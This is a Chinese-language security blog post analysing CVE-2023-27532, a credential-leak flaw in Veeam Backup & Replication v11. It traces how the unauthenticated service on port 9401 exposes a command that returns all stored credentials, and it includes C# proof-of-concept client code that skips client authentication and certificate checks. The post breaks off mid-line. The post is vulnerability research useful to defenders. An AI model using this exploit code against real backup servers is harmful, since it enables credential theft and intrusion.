---
title: CVE-2023-27532 Veeam Backup & Replication leaked credentials
url: https://y4er.com/posts/cve-2023-27532-veeam-backup-replication-leaked-credentials/
source: Y4er的博客
date: 2023-03-18
fetch_date: 2025-10-04T09:55:18.175683
---

# CVE-2023-27532 Veeam Backup & Replication leaked credentials

[Y4er的博客](/ "Y4er的博客")

[归档](/posts/) [专栏](/series/) [分类](/categories/) [标签](/tags/) [笔记](/note/) [朋友](/friends/) [作品](/showcase/)

浅色深色跟随系统

[Y4er的博客](/ "Y4er的博客")

取消

[归档](/posts/)[专栏](/series/)[分类](/categories/)[标签](/tags/)[笔记](/note/)[朋友](/friends/)[作品](/showcase/)

浅色深色跟随系统

## 目录

* [download](#download)
* [install](#install)
* [分析](#分析)

## 目录

* [download](#download)
* [install](#install)
* [分析](#分析)

# CVE-2023-27532 Veeam Backup & Replication leaked credentials

![Y4er avatar](/img/avatar.jpg)[Y4er](https://github.com/Y4er "Author")
 收录于  类别 [代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/) 和 系列 [Veeam](/series/veeam/)

2023-03-17  2023-03-17  约 980 字
 预计阅读 5 分钟

系列 - Veeam

* CVE-2023-27532 Veeam Backup & Replication leaked credentials
* [CVE-2022-26503 Veeam Agent for Microsoft Windows LPE](/posts/cve-2022-26503-veeam-agent-for-microsoft-windows-lpe/)
* [CVE-2022-26500 Veeam Backup & Replication RCE](/posts/cve-2022-26500-veeam-backup-replication-rce/)

目录

* [download](#download)
* [install](#install)
* [分析](#分析)

警告

本文最后更新于 2023-03-17，文中内容可能已过时。

# # download

[https://download2.veeam.com/VBR/v11/VeeamBackup&Replication\_11.0.1.1261\_20211123.iso](https://download2.veeam.com/VBR/v11/VeeamBackup%26Replication_11.0.1.1261_20211123.iso)

# # install

见之前文章 <https://y4er.com/posts/cve-2022-26500-veeam-backup-replication-rce/>

# # 分析

9401端口对应Veeam.Backup.Service.exe

典型的dotnet服务程序，其OnStart创建服务

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/698223be-609c-b84f-5b0a-6d9abfeb3243.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/698223be-609c-b84f-5b0a-6d9abfeb3243.png "image.png")

image.png

CVbServiceImpl构造函数中创建ssl服务

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ebb7c48e-8265-309e-0575-8422210f0272.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ebb7c48e-8265-309e-0575-8422210f0272.png "image.png")

image.png

创建ssl证书，并且绑定在BackupServerSslPort 9401端口上

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/af0fcd8e-c1ab-ccf4-f2bc-6cbf65da5549.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/af0fcd8e-c1ab-ccf4-f2bc-6cbf65da5549.png "image.png")

image.png

`CRemoteInvokeServiceHolder.CreateService(SOptions.Instance.BackupServerSslPort, mngrs)`创建了一个CRemoteInvokeServiceHolder对象

其构造函数将服务绑定在NetTcpBinding上，uri是`net.tcp://172.16.16.153:9401/`，对应的处理类为CVbRestoreServiceStub

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/0baee21a-44d2-f10e-b891-fcc3c4eb7da0.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/0baee21a-44d2-f10e-b891-fcc3c4eb7da0.png "image.png")

image.png

配置文件中可见详细的binding配置 `C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Service.exe.config`

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f787f715-4376-f258-8d75-20655c321537.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f787f715-4376-f258-8d75-20655c321537.png "image.png")

image.png

CVbRestoreServiceStub类中可以用.net remoting wcf的形式调用

csharp

```
NetTcpBinding binding = new NetTcpBinding();
NetTcpSecurity netTcpSecurity = new NetTcpSecurity();
netTcpSecurity.Mode = SecurityMode.Transport;
TcpTransportSecurity tcpTransportSecurity = new TcpTransportSecurity();
tcpTransportSecurity.ClientCredentialType = TcpClientCredentialType.None;
netTcpSecurity.Transport = tcpTransportSecurity;
binding.Security = netTcpSecurity;
binding.Name = "NetTcpBinding";
Uri uri = new Uri("net.tcp://172.16.16.153:9401/");
EndpointAddress endpoint = new EndpointAddress(uri, EndpointIdentity.CreateDnsIdentity("Veeam Backup Server Certificate"));
ChannelFactory<IRemoteInvokeService> myChannelFactory = new ChannelFactory<IRemoteInvokeService>(binding, endpoint);
X509ServiceCertificateAuthentication x509ServiceCertificateAuthentication = new X509ServiceCertificateAuthentication();
x509ServiceCertificateAuthentication.CertificateValidationMode = X509CertificateValidationMode.None;
myChannelFactory.Credentials.ServiceCertificate.SslCertificateAuthentication = x509ServiceCertificateAuthentication;
IRemoteInvokeService cVbRestoreServiceStub = myChannelFactory.CreateChannel(endpoint);
```

通过调用cVbRestoreServiceStub对象下的函数即可。该对象有一个invoke函数

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/211613c0-d687-eff5-ac46-98948045eb42.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/211613c0-d687-eff5-ac46-98948045eb42.png "image.png")

image.png

在ProcessCommand中做函数请求分发

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f000968d-d6d5-990e-3cb7-3727596cef89.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f000968d-d6d5-990e-3cb7-3727596cef89.png "image.png")

image.png

这个功能点太多了，别说泄露凭据，在这出现RCE我都不觉得奇怪。我在这放出来泄露凭据的点吧。

在ExecuteDatabaseManagerCommand中有一个CredentialsDbScopeGetAllCreds的case调用ExecuteCredentialsDbScopeGetAllCreds，顾名思义是拿所有的Creds。

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5808d1a6-8f31-bbf1-41c9-f85f1dc4c892.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5808d1a6-8f31-bbf1-41c9-f85f1dc4c892.png "image.png")

image.png

最终读取凭据并返回

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d8ced442-be42-51ce-a71a-a4c1417ab360.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d8ced442-be42-51ce-a71a-a4c1417ab360.png "image.png")

image.png

debug调试看到确实如此

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/07603723-febb-aa54-1c1c-4214d14b268f.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/07603723-febb-aa54-1c1c-4214d14b268f.png "image.png")

image.png

写代码看看

csharp

```
using System;
using System.IdentityModel.Selectors;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.ServiceModel.Security;
using System.Xml;
using Veeam.Backup.Interaction.MountService;

namespace ConsoleApp4
{
    internal class Program
    {
        static void Main(string[] args)
        {
            NetTcpBinding binding = new NetTcpBinding();
            NetTcpSecurity netTcpSecurity = new NetTcpSecurity();
            netTcpSecurity.Mode = SecurityMode.Transport;
            TcpTransportSecurity tcpTransportSecurity = new TcpTransportSecurity();
            tcpTransportSecurity.ClientCredentialType = TcpClientCredentialType.None;
            netTcpSecurity.Transport = tcpTransportSecurity;
            binding.Security = netTcpSecurity;
            binding.Name = "NetTcpBinding_IRemoteInvokeService";
            Uri uri = new Uri("net.tcp://172.16.16.153:9401/");
            EndpointAddress endpoint = new EndpointAddress(uri, EndpointIdentity.CreateDnsIdentity("Veeam Backup Server Certificate"));
            ChannelFactory<IRemoteInvokeService> myChannelFactory = new ChannelFactory<IRemoteInvokeService>(binding, endpoint);
            X509ServiceCertificateAuthentication x509ServiceCertificateAuthentication = new X509ServiceCertificateAuthentication();
            x509ServiceCertificateAuthentication.CertificateValidationMode = X509CertificateValidationMode.None;
            myChannelFactory.Credentials.ServiceCertificate.SslCertificateAuthentication = x509ServiceCertificateAuthentication;
            IRemoteInvokeService cVbRestoreServiceStub = myChannelFactory.CreateChannel(endpoint);
            Guid guid = Guid.NewGuid();

            MemoryStream memoryStream = new MemoryStream();
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.Serialize(memoryStream, true);
            string base64 = Convert.ToBase64String(memoryStream.ToArray());
            Console.WriteLine(base64);

            string xml = String.Fo...